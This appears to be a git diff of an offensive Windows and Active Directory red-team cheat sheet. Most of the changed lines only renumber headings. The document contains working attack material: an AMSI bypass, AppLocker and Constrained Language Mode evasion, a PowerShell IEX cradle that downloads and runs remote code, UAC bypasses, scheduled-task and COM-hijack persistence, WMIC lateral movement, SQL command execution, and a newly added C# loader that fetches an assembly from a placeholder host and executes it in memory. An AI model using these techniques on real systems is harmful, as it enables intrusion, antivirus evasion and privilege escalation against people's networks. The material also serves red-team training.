@@ -7,9 +7,9 @@ This blog post has been updated based on some tools and techniques from Offensiv
 It should be useful in a lot of cases when dealing with Windows / AD exploitation. This is my quick and dirty cheat sheet. 
 
 
-## Enumeration
+## 1) Enumeration
 
-### 1) LDAP AD enumeration
+### LDAP AD enumeration
 
 ```powershell
 #Build LDAP filters to look for users with SPN values registered for current domain
@@ -132,7 +132,6 @@ $parameters=@("arg1", "arg2")
 ```
 
 
-
 ### 3) Powershell AMSI Bypass
 
 Patching AMSI will help bypass AV warnings triggered when executing PowerShell scripts that are marked as malicious (such as PowerView). Do not use as-is in covert operations, as they will get flagged. Obfuscate, or even better, eliminate the need for an __AMSI bypass__ altogether by altering your scripts to beat signature-based detection.
@@ -168,7 +167,7 @@ $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c
 ```
 
 
-### 3) Applocker 
+### 4) Applocker 
 
 Fortunately for us, there is a powershell module named AppLocker, which can query the AppLocker rules that are enforced on the current system. 
 Below is a simple powershell script that outputs the rules in a readable format so you can use this information to bypass them.
@@ -199,7 +198,7 @@ reg query "HKLM\SOFTWARE\Microsoft\Net Framework Setup\NDP\v4" /s
 ```
 The script will try to find all the AppLocker rules that don’t have the Default Rule in their name and then output the FilePath,FilePublisher and FileHash rules.
 
-### 4) Powershell CLM & LAPS
+### 5) Powershell CLM & LAPS
 
 #### PowerShell Constrained Language Mode
 Sometimes you may find yourself in a PowerShell session that enforces Constrained Language Mode (CLM). This is very often the case when paired with AppLocker.
@@ -226,9 +225,9 @@ Find-LAPSDelegatedGroups
 ```
 
 
-# PrivEsc
+## 6) PrivEsc
 
-#### 1) PowerUp
+#### PowerUp
 
 ```py
 powershell.exe -nop -exec bypass
@@ -242,8 +241,7 @@ If you want to invoke everything without touching disk, use something like this:
 powershell -nop -exec bypass -c “IEX (New-Object Net.WebClient).DownloadString(‘http://bit.ly/1mK64oH’); Invoke-AllChecks”
 ```
 
-
-#### 2) UAC Bypasses
+#### UAC Bypasses
 
 Covenant has `BypassUACCommand` and `BypassUACGrunt` Tasks which can be used 
 
@@ -253,10 +251,9 @@ SharpShell /code:"var startInfo = new System.Diagnostics.ProcessStartInfo { File
 BypassUACCommand cmd.exe "/c powershell -enc [...snip...]"
 ```
 
+## 7) Persistence
 
-## Persistence
-
-### 1) Classic Startup folder
+### Classic Startup folder
 
 Just drop a binary in current user folder, will trigger when current user signs in:
 
@@ -269,7 +266,7 @@ Or in the startup folder, requires administrative privileges but will trigger as
 "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
 ```
 
-### 2) Schedule Tasks
+### Schedule Tasks
 
 This PowerShell script will execute a new Grunt (using our existing PowerShell payload) every 4 hours for up to 30 days. If you omit the RepetitionDuration option in the trigger, it will repeat indefinitely.
 
@@ -303,7 +300,7 @@ To execute this PowerShell script on the target, go to the Interact CLI, import 
 schtasks /create /ru "SYSTEM" /tn "update" /tr "cmd /c c:\windows\temp\update.bat" /sc once /f /st 06:59:00
 ```
 
-### 3) COM Hijacks
+### COM Hijacks
 
 Instead of hijacking COM objects that are in-use and breaking applications that rely on them, a safer strategy is to find instances of applications trying to load objects that don't actually exist (so-called "abandoned" keys).
 
@@ -339,16 +336,16 @@ foreach ($Task in $Tasks)
 }
 ```
 
-## Lateral Movement
+## 8) Lateral Movement
 
-### 1) WMIC Lateral Movement
+### WMIC Lateral Movement
 
 ```cpp
 wmic /node:"192.168.1.2" process call create "C:\Perflogs\434.bat"
 WMIC /node:"DC.example.domain" process call create "rundll32 C:\PerfLogs\arti64.dll, StartW"
 ```
 
-## MSSQL databases
+## 9) MSSQL databases
 
 PowerUpSQL can be used to look for databases within the domain, and gather further information on databases.
 
@@ -379,9 +376,36 @@ Invoke-SQLOSCmd -Instance sql-1.cyberbotic.io -Command 'dir C:\' -RawResults
 Get-SqlServerLinkCrawl -Instance dcorp-mssql | select instance,links | ft
 ```
 
-## Domain Dominance
+## 10) Domain Dominance
 
-## Misc & Encoding
+## 11) NET Assembly Reflection - Web inject
+
+```cs
+using System;
+using System.Net;
+using System.Reflection;
+
+namespace Nappa
+{
+    class Program
+    {
+        static void ReflectFromWeb(string url)
+        {
+            WebClient client = new WebClient();
+            byte[] programBytes = client.DownloadData(url);
+            Assembly dotnetProgram = Assembly.Load(programBytes);
+            object[] parameters = new String[] { null };
+            dotnetProgram.EntryPoint.Invoke(null, parameters);
+        }
+        static void Main(string[] args)
+        {
+            ReflectFromWeb("http://CHANGEME/HelloReflectionWorld.exe");
+        }
+    }
+}
+```
+
+## 12) Misc & Encoding
 
 ##### PeZOR Packing and Encoding 
 
